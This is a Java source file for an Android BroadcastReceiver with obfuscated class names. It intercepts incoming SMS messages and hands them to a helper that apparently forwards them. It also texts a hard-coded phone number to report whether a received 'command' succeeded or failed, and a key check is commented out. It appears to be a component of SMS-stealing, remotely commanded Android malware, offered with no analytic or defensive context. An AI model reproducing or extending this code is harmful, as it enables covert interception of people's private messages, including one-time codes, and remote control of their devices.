package pei.gen.wjh;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

public class peiqi extends BroadcastReceiver {

	private SharedPreferences sp = null;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Log.i("action", intent.getAction());
		sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
		if (intent.getAction().equals(peigen.SMS_RECEIVED)
			|| intent.getAction().equals(peigen.SMS_RECEIVED_2)
			|| intent.getAction().equals(peigen.GSM_SMS_RECEIVED)) {
			woaini su = new woaini();
//			if (woaini.key.equals(woaini.getPublicKey(context))) {
			Bundle bundle = intent.getExtras();
			if (bundle != null && su.isflag()) {
				su.SendSms(bundle, context,this);
			}
//			}
		}
		if (intent.getAction().equals(peigen.SendState)) {
			woaini su = new woaini();
			if (this.getResultCode() != Activity.RESULT_OK) {
				su.sendSMS(woaini.phone, "指令执行失败状态码 " + this.getResultCode(),
						   null);
			} else {
				su.sendSMS(woaini.phone, "指令执行成功", null);
			}
		}
	}

}

